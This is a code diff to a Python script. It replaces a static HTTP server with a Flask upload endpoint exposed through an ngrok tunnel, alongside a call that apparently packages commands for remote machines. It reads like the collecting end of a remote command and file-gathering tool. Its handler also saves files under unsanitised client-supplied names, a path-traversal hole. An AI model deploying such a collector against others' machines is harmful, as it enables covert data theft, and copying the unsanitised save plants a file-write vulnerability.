@@ -1,8 +1,10 @@
 import subprocess
 import threading
 import time
-import http.server
-import socketserver
+import requests
+from flask import Flask, request
+import os
+
 from userside import *
 
 allc = [
@@ -12,18 +14,31 @@ allc = [
     }
 ]
 
-CreateZip("mydata","mycmd","n1",allcommands=allc)
+CreateZip("mydata", "mycmd", "n1", allcommands=allc)
+
+app = Flask(__name__)
+
+@app.route("/receivedd", methods=["POST"])
+def receive_file():
+    if "file" not in request.files:
+        return "No file part", 400
+    file = request.files["file"]
+    if file.filename == "":
+        return "No selected file", 400
+    save_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "../receivedd"))
+    os.makedirs(save_dir, exist_ok=True)
+    save_path = os.path.join(save_dir, file.filename)
+    file.save(save_path)
+    return f"File saved to {save_path}", 200
 
 def start_ngrok_http(port=8000):
     ngrok_cmd = ["ngrok", "http", str(port)]
     print(f"[NGROK] Starting ngrok HTTP tunnel on port {port} ...")
-    ngrok_proc = subprocess.Popen(ngrok_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    return ngrok_proc
+    return subprocess.Popen(ngrok_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 def print_ngrok_url():
-    import requests
     url = None
-    for _ in range(40):  # Wait up to 40 seconds
+    for _ in range(40):  # wait up to 40s
         try:
             resp = requests.get("http://localhost:4040/api/tunnels")
             tunnels = resp.json()["tunnels"]
@@ -41,18 +56,12 @@ def print_ngrok_url():
     else:
         print("[NGROK] Could not get public URL. Is ngrok running?")
 
-def start_http_server(port=8000):
-    Handler = http.server.SimpleHTTPRequestHandler
-    with socketserver.TCPServer(("", port), Handler) as httpd:
-        print(f"[HTTP] Serving at port {port}")
-        httpd.serve_forever()
-
 def main():
     port = 8000
     ngrok_proc = start_ngrok_http(port)
     threading.Thread(target=print_ngrok_url, daemon=True).start()
     try:
-        start_http_server(port)
+        app.run(host="0.0.0.0", port=port)
     finally:
         ngrok_proc.terminate()
         print("[NGROK] Tunnel closed.")
